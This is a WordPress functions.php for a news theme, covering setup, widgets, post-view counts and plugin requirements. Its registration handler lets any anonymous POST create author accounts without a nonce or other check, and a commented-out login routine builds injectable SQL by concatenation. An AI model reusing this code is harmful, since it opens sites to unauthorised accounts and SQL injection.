<?php
/*/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                                                                                                                       
 ____        ____    ___    ___    ___    ___    ___________    ____        ____    ___________    ___    ____________ 
|    \      /    |  |   |  |   |  |   |  |   |  |           |  |    \      /    |  |           |  |   |  |            |
|     \    /     |  |___|  |   |  |   |  |___|  |    ___    |  |     \    /     |  |    ___    |  |   |  |    ____    |
|      \  /      |   ___   |   |  |   |   ___   |   |   |   |  |      \  /      |  |   |   |   |  |   |  |   |    |   |
|       \/       |  |   |  |   |  |   |  |   |  |   |   |   |  |       \/       |  |   |   |   |  |   |  |   |____|   |
|   |\      /|   |  |   |  |   |  |   |  |   |  |   |   |   |  |   |\      /|   |  |   |   |   |  |   |  |            |
|   | \____/ |   |  |   |  |   |  |   |  |   |  |   |   |   |  |   | \____/ |   |  |   |   |   |  |   |  |    ____    |
|   |        |   |  |   |  |   |  |   |  |   |  |   |___|   |  |   |        |   |  |   |___|   |  |   |  |   |    |   |
|   |        |   |  |   |  |   |  |   |  |   |  |           |  |   |        |   |  |           |  |   |  |   |    |   |
|___|        |___|  |___|  |___|  |___|  |___|  |___________|  |___|        |___|  |___________|  |___|  |___|    |___|


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////*/


//////////////////////////////////////////////////////////////////////////
//// THEME SETUP
//////////////////////////////////////////////////////////////////////////

if ( !function_exists( 'breaknews_setup' ) ) {

	function breaknews_setup() {

		// Support Localization
		load_theme_textdomain( 'breaknews', get_template_directory() . '/languages' );
		
		// Support Feed Links
		add_theme_support( 'automatic-feed-links' );

		// Support Title Tags
		add_theme_support( 'title-tag' );

		// Featured Images
		add_theme_support( 'post-thumbnails' );
		add_image_size( 'breaknews-full-thumb', 1080, 0, true );
		add_image_size( 'breaknews-misc-thumb', 540, 360, true );

		// Register Menus
		register_nav_menus( array(
			'main-menu'   => esc_html__( 'Primary Menu', 'breaknews' ),
			'footer-menu' => esc_html__( 'Footer Menu', 'breaknews' ),
		) );

		// Switch default core markup for search form, comment form, and comments to output valid HTML5.
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Support post formats
		add_theme_support( 'post-formats', array( 'standard', 'video', 'audio', 'gallery', 'image' ) );

		// Theme Options
		include get_template_directory() . '/inc/theme-options.php'; 

	}

}
add_action( 'after_setup_theme', 'breaknews_setup' );

//////////////////////////////////////////////////////////////////////////
//// SET CONTENT WIDTH
//////////////////////////////////////////////////////////////////////////
function breaknews_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'breaknews_content_width', 640 );
}
add_action( 'after_setup_theme', 'breaknews_content_width', 0 );

//////////////////////////////////////////////////////////////////////////
//// REGISTER SIDEBARS
//////////////////////////////////////////////////////////////////////////
function breaknews_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Main Sidebar', 'breaknews' ),
		'id'            => 'sidebar-1',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Area #1', 'breaknews' ),
		'id'            => 'sidebar-2',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Area #2', 'breaknews' ),
		'id'            => 'sidebar-3',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Area #3', 'breaknews' ),
		'id'            => 'sidebar-4',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Instagram Footer', 'breaknews' ),
		'id'            => 'sidebar-5',
		'before_widget' => '<section id="%1$s" class="instagram-widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="instagram-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'breaknews_widgets_init' );

//////////////////////////////////////////////////////////////////////////
//// ENQUEUE STYLES AND SCRIPTS
//////////////////////////////////////////////////////////////////////////
function breaknews_scripts() {

	global $breaknews;

	// stylesheets
	wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/css/font-awesome/css/font-awesome.min.css' );

	wp_enqueue_style( 'bxslider-css', get_template_directory_uri() . '/css/jquery.bxslider.css' );
	wp_enqueue_style( 'breaknews-style', get_stylesheet_uri() );
	wp_enqueue_style( 'breaknews-responsive', get_template_directory_uri() . '/css/responsive.css' );
	
	wp_enqueue_style( 'breaknews-bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css' );
	

	if( $breaknews['bn-rtl-mode'] ) {
		wp_enqueue_style( 'breaknews-rtl', get_template_directory_uri() . '/css/rtl.css' );
	}

	wp_enqueue_style( 'breaknews-custom-bootstrap', get_template_directory_uri() . '/css/custom.css' );

	// scripts

	wp_enqueue_script( 'breaknews-bootstrap-script', get_template_directory_uri() . '/js/bootstrap.min.js', array('jquery'), '3.1' );

	//wp_enqueue_script( 'crypto', get_template_directory().'/js/crypto.js', array('jquery'), null, true );
	 //wp_enqueue_script( 'modal', get_template_directory_uri() . '/js/bootstrap_modal.js', array('jquery'), null, true );

	wp_enqueue_script( 'breaknews-bootstrap-scriptjs', get_template_directory_uri() . '/js/jquery.min.js', array('jquery'), '2.2.4' );
	wp_enqueue_script( 'breaknews-script', get_template_directory_uri() . '/js/breaknews.js', array('jquery'), '1.0' );
	wp_enqueue_script( 'bxslider', get_template_directory_uri() . '/js/jquery.bxslider.min.js', array('jquery'), '', true );
	wp_enqueue_script( 'nicescroll', get_template_directory_uri() . '/js/jquery.nicescroll.min.js', array('jquery') );

	// JS variables
	$localize_args = array(
		'social_btn_color' => $breaknews['bn-social-btn-color'],
		'main_color' => $breaknews['bn-main-color'],
	);

	wp_localize_script( 'breaknews-script', 'breaknews', $localize_args );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'breaknews_scripts' );

function breaknews_admin_scripts() {
	wp_enqueue_style( 'breaknews-admin-style', get_template_directory_uri() . '/css/admin-area-style.css' );
}

add_action( 'admin_enqueue_scripts', 'breaknews_admin_scripts' );


//////////////////////////////////////////////////////////////////////////
//// CUSTOMIZE OPTIONS PANEL STYLE
//////////////////////////////////////////////////////////////////////////
function breaknews_options_panel_style() {

    wp_register_style(
        'breaknews-options-panel',
        get_template_directory_uri() . '/css/options-panel.css',
        array( 'redux-admin-css' ), // Be sure to include redux-admin-css so it's appended after the core css is applied
        time(),
        'all'
    ); 

    wp_enqueue_style('breaknews-options-panel');
}
add_action( 'redux/page/breaknews/enqueue', 'breaknews_options_panel_style' );

//////////////////////////////////////////////////////////////////////////
//// CUSTOM EDITOR STYLE
//////////////////////////////////////////////////////////////////////////
 add_editor_style( get_template_directory_uri() . '/css/custom-editor-style.css');

//////////////////////////////////////////////////////////////////////////
//// INCLUDE FILES
//////////////////////////////////////////////////////////////////////////

// Widgets
include get_template_directory() . '/inc/widgets/popular_posts_widget.php';
include get_template_directory() . '/inc/widgets/latest_posts_widget.php';
include get_template_directory() . '/inc/widgets/about_widget.php';
include get_template_directory() . '/inc/widgets/social_widget.php';
include get_template_directory() . '/inc/widgets/facebook_widget.php';
include get_template_directory() . '/inc/widgets/twitter_widget.php';

// Custom CSS & JS
include get_template_directory() . "/inc/custom-css-js.php";

// Required Plugins
include get_template_directory() . "/class-tgm-plugin-activation.php";

//////////////////////////////////////////////////////////////////////////
//// REMOVE REDUX MENU
//////////////////////////////////////////////////////////////////////////
function breaknews_remove_redux_menu() {
    remove_submenu_page('tools.php','redux-about');
}
add_action( 'admin_menu', 'breaknews_remove_redux_menu',12 );

//////////////////////////////////////////////////////////////////////////
//// NICESCROLL
//////////////////////////////////////////////////////////////////////////
function breaknews_body_class( $classes ) {
	global $breaknews;

	$new = array();
	if ( $breaknews['bn-nicescroll'] ) {
		$new[] = 'has-nicescroll';
		array_merge( $classes, $new );
	}
	return $new;
}
add_filter( 'body_class', 'breaknews_body_class' );

//////////////////////////////////////////////////////////////////////////
//// FEATURED AREA QUERY POSTS
//////////////////////////////////////////////////////////////////////////
function breaknews_featured_query($number, $custom = array() ) {
	global $breaknews;
	$feat_cats         = $breaknews['bn-featured-categories'];
	$query_type        = $breaknews['bn-featured-query-type'];
	$excluded_formats  = $breaknews['bn-featured-excluded-formats'];
	$format_video      = $excluded_formats['1'];
	$format_audio      = $excluded_formats['2'];
	$format_gallery    = $excluded_formats['3'];

	$excluded_formats = array();

	if( $format_video    == '1' ) { array_push( $excluded_formats, 'post-format-video' ); }
	if( $format_audio    == '1' ) { array_push( $excluded_formats, 'post-format-audio' ); }
	if( $format_gallery  == '1' ) { array_push( $excluded_formats, 'post-format-gallery' ); }

	
	$args = array(
		'showposts' => $number,
		'cat' => $feat_cats,
		'ignore_sticky_posts' => 1,
		'tax_query' => array(
			array(
			    'taxonomy' => 'post_format',
			    'field' => 'slug',
			    'terms' => $excluded_formats,
			    'operator' => 'NOT IN'
			),
		)
	);

	if($query_type === 'trending') {
		$query_args = array(
	        'meta_key' => 'bn_post_views_count',
	        'orderby' => 'meta_value_num',
	        'date_query' => array('after'=>'-7 days')
		);
		$args = array_merge($args, $query_args);
	}

	if($query_type === 'popular') {
		$query_args = array(
	        'meta_key' => 'bn_post_views_count',
	        'orderby' => 'meta_value_num',
	        'date_query' => array('after'=>'-30 days')
		);
		$args = array_merge($args, $query_args);
	}

	if($query_type === 'random') {
		$query_args = array(
	        'orderby' => 'rand',
		);
		$args = array_merge($args, $query_args);
	}

	$args = array_merge($args, $custom);

	$featured_query = new WP_Query( $args );

	return $featured_query;

}
	
//////////////////////////////////////////////////////////////////////////
//// POST VIEWS
//////////////////////////////////////////////////////////////////////////
// Default post views count
function breaknews_set_default_post_views( $post_id ) {
    add_post_meta( $post_id, 'bn_post_views_count', '0' );
}
add_action( 'wp_insert_post', 'breaknews_set_default_post_views' );

// Set views meta key for all old posts to zero
function breaknews_old_posts_views() {
	$posts = new WP_Query(array('posts_per_page' => -1));
	$count_key = 'bn_post_views_count';
	if($posts->have_posts()) {
		while($posts->have_posts()) {
			$posts->the_post();
			$views = get_post_meta(get_the_id(), $count_key, true);
			if($views === '') {
				add_post_meta(get_the_id(), $count_key, 0);
			}
		}
		wp_reset_postdata();
	}
}
add_action("after_switch_theme", "breaknews_old_posts_views");

// Update the post views number every time the user visit the post
function breaknews_track_post_views () {
    if( !is_single() ) return;

    global $post;
    $post_id = $post->ID;  
 
    $count_key = 'bn_post_views_count';
    $views = get_post_meta($post_id, $count_key, true);
    if($views == ''){
        delete_post_meta($post_id, $count_key);
        add_post_meta($post_id, $count_key, '0');
    }else{
        $views++;
        update_post_meta($post_id, $count_key, $views);
    }
}
add_action( 'wp_head', 'breaknews_track_post_views');

//////////////////////////////////////////////////////////////////////////
//// CATEGORIZED BLOG
//////////////////////////////////////////////////////////////////////////
function breaknews_categorized_blog() {
	if ( false === ( $all_the_cool_cats = get_transient( 'breaknews_categories' ) ) ) {
		// Create an array of all the categories that are attached to posts.
		$all_the_cool_cats = get_categories( array(
			'fields'     => 'ids',
			'hide_empty' => 1,
			// We only need to know if there is more than one category.
			'number'     => 2,
		) );

		// Count the number of categories that are attached to the posts.
		$all_the_cool_cats = count( $all_the_cool_cats );

		set_transient( 'breaknews_categories', $all_the_cool_cats );
	}

	if ( $all_the_cool_cats > 1 ) {
		
		return true;
		
	} else {
		
		return false;
		
	}
}

//////////////////////////////////////////////////////////////////////////
//// THE EXCERPT
//////////////////////////////////////////////////////////////////////////
function breaknews_custom_excerpt_length( $length ) {
	// Increase the excerpt words
	return 150;
}
add_filter( 'excerpt_length', 'breaknews_custom_excerpt_length', 99 );

function breaknews_limit_excerpt_words( $excerpt, $limit ) {
	$words = explode( ' ', $excerpt, ( $limit + 1 ) );
	
	// To delete the [..]
	if( count( $words ) > $limit ) {
		array_pop( $words );
	}
	
	return implode( ' ', $words );
}

add_filter( 'the_title', 'wpse_75691_trim_words' );
function wpse_75691_trim_words( $title )
{
    // limit to ten words
    return wp_trim_words( $title, 10, '' );
}

//////////////////////////////////////////////////////////////////////////
//// BREAKNEWS PAGINATION
//////////////////////////////////////////////////////////////////////////
function breaknews_pagination_numbers() {

	?>
	
	<div class="pagination numeric">
		<?php echo paginate_links( ); ?>
	</div>
					
	<?php
	
}

function breaknews_pagination_next_prev() {
	
	?>
	
	<div class="pagination next_prev">

		<div class="older"><?php next_posts_link(); ?></div>
		<div class="newer"><?php previous_posts_link(); ?></div>
		
	</div>
					
	<?php
	
}

//////////////////////////////////////////////////////////////////////////
//// COMMENTS WALKER
//////////////////////////////////////////////////////////////////////////
function breaknews_comments( $comment, $args, $depth ) {

	?>
	<li <?php comment_class(); ?> id="comment-<?php comment_ID() ?>">
		
		<div class="comment-block">
					
			<div class="author-img">
				<?php echo get_avatar( $comment, $args['avatar_size'] ); ?>
			</div>
			
			<div class="comment-text">
				<span class="author"><?php echo get_comment_author_link(); ?></span>
				<span class="date"><?php printf( esc_html__( '%1$s at %2$s', 'breaknews' ), get_comment_date(),  get_comment_time() ) ?></span>
				<?php if ($comment->comment_approved == '0') : ?>
					<em><i class="icon-info-sign"></i> <?php esc_html_e('Comment awaiting approval', 'breaknews'); ?></em>
					<br />
				<?php endif; ?>
				<?php comment_text(); ?>
			</div>

			<div class="reply">
				<?php comment_reply_link(array_merge( $args, array('reply_text' => esc_html__('Reply', 'breaknews'), 'depth' => $depth, 'max_depth' => $args['max_depth'])), $comment->comment_ID); ?>
				<?php edit_comment_link(esc_html__('Edit', 'breaknews')); ?>
			</div>
					
		</div>
		
	</li>

	<?php
}

//////////////////////////////////////////////////////////////////////////
//// SOCIAL LINKS
//////////////////////////////////////////////////////////////////////////
function breaknews_social_links( $tooltip = true ) {

	global $breaknews;
 	$tooltip_str = $tooltip ? 'class="tooltip"' : '';

 	if ( $breaknews['bn-facebook-link'] ) {
 		echo '<a href="' . esc_url($breaknews['bn-facebook-link']) . '" class="smoth" target="_blank"><div class="fa fa-facebook"></div><span '.$tooltip_str.'>'.esc_html__('Facebook', 'rewaia').'</span></a>';
 	}
 	if ( $breaknews['bn-twitter-link'] ) {
 		echo '<a href="' . esc_url($breaknews['bn-twitter-link']) . '" class="smoth" target="_blank"><div class="fa fa-twitter"></div><span '.$tooltip_str.'>'.esc_html__('Twitter', 'rewaia').'</span></a>';
 	}
 	if ( $breaknews['bn-google-plus-link'] ) {
 		echo '<a href="' . esc_url($breaknews['bn-google-plus-link']) . '" class="smoth" target="_blank"><div class="fa fa-google-plus"></div><span '.$tooltip_str.'>'.esc_html__('Google+', 'rewaia').'</span></a>';
 	}
 	if ( $breaknews['bn-linked-in-link'] ) {
 		echo '<a href="' . esc_url($breaknews['bn-linked-in-link']) . '" class="smoth" target="_blank"><div class="fa fa-linkedin"></div><span '.$tooltip_str.'>'.esc_html__('Linked In', 'rewaia').'</span></a>';
 	}
 	if ( $breaknews['bn-pinterest-link'] ) {
 		echo '<a href="' . esc_url($breaknews['bn-pinterest-link']) . '" class="smoth" target="_blank"><div class="fa fa-pinterest-p"></div><span '.$tooltip_str.'>'.esc_html__('Pinterest', 'rewaia').'</span></a>';
 	}
 	if ( $breaknews['bn-instagram-link'] ) {
 		echo '<a href="' . esc_url($breaknews['bn-instagram-link']) . '" class="smoth" target="_blank"><div class="fa fa-instagram"></div><span '.$tooltip_str.'>'.esc_html__('Instagram', 'rewaia').'</span></a>';
 	}
 	if ( $breaknews['bn-tumblr-link'] ) {
 		echo '<a href="' . esc_url($breaknews['bn-tumblr-link']) . '" class="smoth" target="_blank"><div class="fa fa-tumblr"></div><span '.$tooltip_str.'>'.esc_html__('Tumblr', 'rewaia').'</span></a>';
 	}
 	if ( $breaknews['bn-youtube-link'] ) {
 		echo '<a href="' . esc_url($breaknews['bn-youtube-link']) . '" class="smoth" target="_blank"><div class="fa fa-youtube-play"></div><span '.$tooltip_str.'>'.esc_html__('Youtube', 'rewaia').'</span></a>';
 	}
 	if ( $breaknews['bn-vimeo-link'] ) {
 		echo '<a href="' . esc_url($breaknews['bn-vimeo-link']) . '" class="smoth" target="_blank"><div class="fa fa-vimeo"></div><span '.$tooltip_str.'>'.esc_html__('Vimeo', 'rewaia').'</span></a>';
 	}
 	if ( $breaknews['bn-soundcloud-link'] ) {
 		echo '<a href="' . esc_url($breaknews['bn-soundcloud-link']) . '" class="smoth" target="_blank"><div class="fa fa-soundcloud"></div><span '.$tooltip_str.'>'.esc_html__('Soundcloud', 'rewaia').'</span></a>';
 	}
 	if ( $breaknews['bn-dribbble-link'] ) {
 		echo '<a href="' . esc_url($breaknews['bn-dribbble-link']) . '" class="smoth" target="_blank"><div class="fa fa-dribbble"></div><span '.$tooltip_str.'>'.esc_html__('Dribbble', 'rewaia').'</span></a>';
 	}
 	if ( $breaknews['bn-reddit-link'] ) {
 		echo '<a href="' . esc_url($breaknews['bn-reddit-link']) . '" class="smoth" target="_blank"><div class="fa fa-reddit"></div><span '.$tooltip_str.'>'.esc_html__('Reddit', 'rewaia').'</span></a>';
 	}
 	if ( $breaknews['bn-rss-link'] ) {
 		echo '<a href="' . esc_url($breaknews['bn-rss-link']) . '" class="smoth" target="_blank"><div class="fa fa-rss"></div><span '.$tooltip_str.'>'.esc_html__('RSS', 'rewaia').'</span></a>';
 	}
}

//////////////////////////////////////////////////////////////////////////
//// REQUIRED PLUGINS
//////////////////////////////////////////////////////////////////////////

function breaknews_required_plugins() {
	// plugins
	$plugins = array(
		array(
			'name'     				=> esc_html__('Vafpress Post Formats UI', 'breaknews'), // The plugin name
			'slug'     				=> 'vafpress-post-formats-ui-develop', // The plugin slug (typically the folder name)
			'source'     			=> esc_url('https://github.com/vafour/vafpress-post-formats-ui/archive/develop.zip'), // The plugin source
			'required' 				=> true,  // If false, the plugin is only 'recommended' instead of required
			'external_url' 			=> esc_url('https://codeload.github.com/vafour/vafpress-post-formats-ui/zip/develop'), // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html__("Milliomola Contact Methods", 'breaknews'), // The plugin name
			'slug'     				=> 'milliomola-contact-methods', // The plugin slug (typically the folder name)
			'source'     			=> esc_url('http://milliomola.com/plugins/milliomola-contact-methods.zip'), // The plugin source
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'external_url' 			=> esc_url('http://milliomola.com/plugins/milliomola-contact-methods.zip'), // If set, overrides default API URL and points to an external URL
		),
		array(
			'name'     				=> esc_html('Contact Form 7', 'rewaia'), // The plugin name
			'slug'     				=> 'contact-form-7', // The plugin slug (typically the folder name)
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
		),
		array(
			'name'     				=> esc_html__('Redux Framework', 'breaknews'), // The plugin name
			'slug'     				=> 'redux-framework', // The plugin slug (typically the folder name)
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'force_activation' 		=> true, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
		),
		array(
			'name'     				=> esc_html__('WP Instagram Widget', 'breaknews'), // The plugin name
			'slug'     				=> 'wp-instagram-widget', // The plugin slug (typically the folder name)
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
		),
		array(
			'name'     				=> esc_html__("Dave's WordPress Live Search", 'breaknews'), // The plugin name
			'slug'     				=> 'daves-wordpress-live-search', // The plugin slug (typically the folder name)
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
		),
	);

	// configuration
	$config = array(
		'id'           => 'breaknews',            // Unique ID for hashing notices for multiple instances of TGMPA.
		'default_path' => '',                      // Default absolute path to bundled plugins.
		'menu'         => 'tgmpa-install-plugins', // Menu slug.
		'has_notices'  => true,                    // Show admin notices or not.
		'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
		'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
		'is_automatic' => false,                   // Automatically activate plugins after installation or not.
		'message'      => '',                      // Message to output right before the plugins table.

		
		'strings'      => array(
			'page_title'                      => esc_html__( 'Install Required Plugins', 'breaknews' ),
			'menu_title'                      => esc_html__( 'Install Plugins', 'breaknews' ),
			/* translators: %s: plugin name. */
			'installing'                      => esc_html__( 'Installing Plugin: %s', 'breaknews' ),
			/* translators: %s: plugin name. */
			'updating'                        => esc_html__( 'Updating Plugin: %s', 'breaknews' ),
			'oops'                            => esc_html__( 'Something went wrong with the plugin API.', 'breaknews' ),
			'notice_can_install_required'     => _n_noop(
				/* translators: 1: plugin name(s). */
				'This theme requires the following plugin: %1$s.',
				'This theme requires the following plugins: %1$s.',
				'breaknews'
			),
			'notice_can_install_recommended'  => _n_noop(
				/* translators: 1: plugin name(s). */
				'This theme recommends the following plugin: %1$s.',
				'This theme recommends the following plugins: %1$s.',
				'breaknews'
			),
			'notice_ask_to_update'            => _n_noop(
				/* translators: 1: plugin name(s). */
				'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.',
				'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.',
				'breaknews'
			),
			'notice_ask_to_update_maybe'      => _n_noop(
				/* translators: 1: plugin name(s). */
				'There is an update available for: %1$s.',
				'There are updates available for the following plugins: %1$s.',
				'breaknews'
			),
			'notice_can_activate_required'    => _n_noop(
				/* translators: 1: plugin name(s). */
				'The following required plugin is currently inactive: %1$s.',
				'The following required plugins are currently inactive: %1$s.',
				'breaknews'
			),
			'notice_can_activate_recommended' => _n_noop(
				/* translators: 1: plugin name(s). */
				'The following recommended plugin is currently inactive: %1$s.',
				'The following recommended plugins are currently inactive: %1$s.',
				'breaknews'
			),
			'install_link'                    => _n_noop(
				'Begin installing plugin',
				'Begin installing plugins',
				'breaknews'
			),
			'update_link'                     => _n_noop(
				'Begin updating plugin',
				'Begin updating plugins',
				'breaknews'
			),
			'activate_link'                   => _n_noop(
				'Begin activating plugin',
				'Begin activating plugins',
				'breaknews'
			),
			'return'                          => esc_html__( 'Return to Required Plugins Installer', 'breaknews' ),
			'dashboard'                       => esc_html__( 'Return to the Dashboard', 'breaknews' ),
			'plugin_activated'                => esc_html__( 'Plugin activated successfully.', 'breaknews' ),
			'activated_successfully'          => esc_html__( 'The following plugin was activated successfully:', 'breaknews' ),
			/* translators: 1: plugin name. */
			'plugin_already_active'           => esc_html__( 'No action taken. Plugin %1$s was already active.', 'breaknews' ),
			/* translators: 1: plugin name. */
			'plugin_needs_higher_version'     => esc_html__( 'Plugin not activated. A higher version of %s is needed for this theme. Please update the plugin.', 'breaknews' ),
			/* translators: 1: dashboard link. */
			'complete'                        => esc_html__( 'All plugins installed and activated successfully. %1$s', 'breaknews' ),
			'dismiss'                         => esc_html__( 'Dismiss this notice', 'breaknews' ),
			'notice_cannot_install_activate'  => esc_html__( 'There are one or more required or recommended plugins to install, update or activate.', 'breaknews' ),
			'contact_admin'                   => esc_html__( 'Please contact the administrator of this site for help.', 'breaknews' ),
		)
		
	);

	tgmpa( $plugins, $config );
}

add_action( 'tgmpa_register', 'breaknews_required_plugins' );


// function for total post visitor

function getPostViews($postID){
    $count_key = 'post_views_count';

    $count = get_post_meta($postID, $count_key, true);
   
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count.'';
}
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}
// Remove issues with prefetching adding extra views
//remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);

/*add_filter('manage_posts_columns', 'posts_column_views');
add_action('manage_posts_custom_column', 'posts_custom_column_views',5,2);
function posts_column_views($defaults){
    $defaults&#91;'post_views'&#93; = __('Views');
    return $defaults;
}
function posts_custom_column_views($column_name, $id){
	if($column_name === 'post_views'){
        echo getPostViews(get_the_ID());
    }
}*/


// for post ratings
/*
function wp_star_rating( $args = array() ) {
	
	$defaults = array(
	'rating' => 0,
	'type' => 'rating',
	'number' => 0,
	);
	$r = wp_parse_args( $args, $defaults );
	extract( $r, EXTR_SKIP );
	 
	// Non-english decimal places when the $rating is coming from a string
	$rating = str_replace( ',', '.', $rating );
	 
	// Convert Percentage to star rating, 0..5 in .5 increments
	if ( 'percent' == $type ) {
	$rating = round( $rating / 10, 0 ) / 2;
	}
	 
	// Calculate the number of each type of star needed
	$full_stars = floor( $rating );
	$half_stars = ceil( $rating - $full_stars );
	$empty_stars = 5 - $full_stars - $half_stars;
	 
	if ( $number ) {
	/* translators: 1: The rating, 2: The number of ratings */
/*	$title = _n( '%1$s rating based on %2$s rating', '%1$s rating based on %2$s ratings', $number );
	$title = sprintf( $title, number_format_i18n( $rating, 1 ), number_format_i18n( $number ) );
	} else {
	/* translators: 1: The rating */
/*	$title = sprintf( __( '%s rating' ), number_format_i18n( $rating, 1 ) );
	}
	 
	echo '<div class="star-rating" title="' . esc_attr( $title ) . '">';
	echo str_repeat( '<div class="star star-full"></div>', $full_stars );
	echo str_repeat( '<div class="star star-half"></div>', $half_stars );
	echo str_repeat( '<div class="star star-empty"></div>', $empty_stars);
	echo '</div>';
}*/


//for ajax form submit


//for using ajax in wordpress

wp_enqueue_script('jquery');

add_action('init', 'custom_user_registration');
function custom_user_registration()
{
	global $wpdb;
	//echo "string";
	if(isset($_POST["fullname"])){
		global $wpdb;
		//echo "hii";
		$name=$_POST["fullname"];
		$username = $wpdb->escape($_REQUEST['fullname']);
		
		$email=$_POST["email"];
		$password=$_POST["password"];
		 $tablename = $wpdb->prefix."users";
		 $email = $wpdb->escape($_REQUEST['email']);  
  
		if (!is_email($email))  
   		{  
    		$errors['email'] = "Please enter a valid email";
    		echo "<p style='color:#b30000;'>দয়া করা সঠিক ইমেইল প্রদান করুন *</p>" ;  
    	}  
		elseif (email_exists($email))  
    	{  
    		$errors['email'] = "This email address is already in use"; 
    		echo "<p style='color:#b30000;'>এই ইমেল আইডি টি বর্তমান দয়া করা অন্য ইমেল আইডি প্রদান করুন*</p>" ; 
    	}
    	if (0 === count($errors))  
	    {    
	    	//$create_fname = explode(" ",$username);
	    	//$date=now();

	    	
	    	$user_data = array(
	    		'id' => '',
				'user_pass' => $password,
				'user_login' => $email,
				'user_nicename' => $email,
				'user_email' => $email,
				'display_name' => $username,
				'nickname' => $username,
				//'first_name' => $create_fname[0],
				'user_registered' => $date,
				'role' => 'author',
	    	);
	    	//print_r($pass);
	    		$new_user_id = wp_insert_user( $user_data );
	    		//echo 'sds'.$pass;
	    	//$new_user_id = wp_create_user($username, $password, $email);  
	  
	    // You could do all manner of other things here like send an email to the user, etc. I leave that to you.  
	    	
	  			if( !is_wp_error($new_user_id) ){
				    	/*$success = 1; 
						    if($success==1)
						    {*/
			    	echo '<p style="color:#00cc00;">আপনার নিবদ্ধীকরণ সম্পূর্ণ হয়েছে</p>' ; 
			    }
			    else
			    {
			    	 echo '<p style="color:#b30000;">আপনার নিবদ্ধীকরণ সম্পূর্ণ হয়নি পুনরায় চেষ্টা করুন</p>'; 
			    	 //echo $new_user_id->get_error_message();
			    }
	    //header('Location:' . get_bloginfo('url') . '/login/?success=1&u=' . $username);  
	    }  
	    
		/*$datum = $wpdb->get_results("SELECT * FROM $tablename WHERE user_email = '".$email."'");
		//echo "SELECT * FROM $tablename WHERE user_email = '".$email."'";
		if($wpdb->num_rows > 0) {
	        echo "<p style='color:#6F2516;'>email id already exist*</p>" ;
	    }
	    else
	    {			    

	    	 $user_id = $wpdb->insert('wp_users',array('user_nicename' => $name,'user_login'=>$email, 'user_email' => $email,'display_name'=>$name,'user_pass' => wp_hash_password($password)));

	    	 echo 'successful' ;
	    }*/

		die();
	}

}

add_action('wp_ajax_custom_user_registration', 'custom_user_registration');
add_action('wp_ajax_nopriv_custom_user_registration', 'custom_user_registration');


/*function custom_user_login()
{
	global $wpdb;
	print_r($_POST);
	//echo "string";
	if(isset($_POST["login_submit"])){
		

		$email=$_POST["userEmail"];
		$password=$_POST["userPass"];
		$valid_pass = password_hash($password, PASSWORD_DEFAULT);
		echo $valid_pass ;
		//$valid_pass = password_verify ( $password, $hash );
		 $tablename = $wpdb->prefix."users";
		 
		$datum = $wpdb->get_results("SELECT * FROM $tablename WHERE user_email = '".$email."' AND user_pass= '".$valid_pass."'");
		echo "SELECT * FROM $tablename WHERE user_email = '".$email."' AND user_pass= '".$valid_pass."'" ;
		if($wpdb->num_rows == 0) {
	        echo "<p style='color:#6F2516;'>Your email or password is wrong*</p>" ;
	    }
	    else
	    {			    

	    	 //$user_id = $wpdb->insert('wp_users',array('user_nicename' => $name, 'user_email' => $email, 'user_pass' => wp_hash_password($password)));

	    	 echo 'successful' ;
	    }	
		die();
	}

}

add_action('wp_ajax_custom_user_login', 'custom_user_login');
add_action('wp_ajax_nopriv_custom_user_login', 'custom_user_login');*/


function breaknews_ajax_login_init(){

    //wp_register_script('ajax-login-script', get_template_directory_uri() . '/js/ajax-login-script.js', array('jquery') ); 
    //wp_enqueue_script('ajax-login-script');

   /*wp_localize_script( 'ajax-login-script', 'ajax_login_object', array( 
        'ajaxurl' => admin_url( 'admin-ajax.php' ),
        'loadingmessage' => __('Sending user info, please wait...')
    ));

    // Enable the user with no privileges to run ajax_login() in AJAX
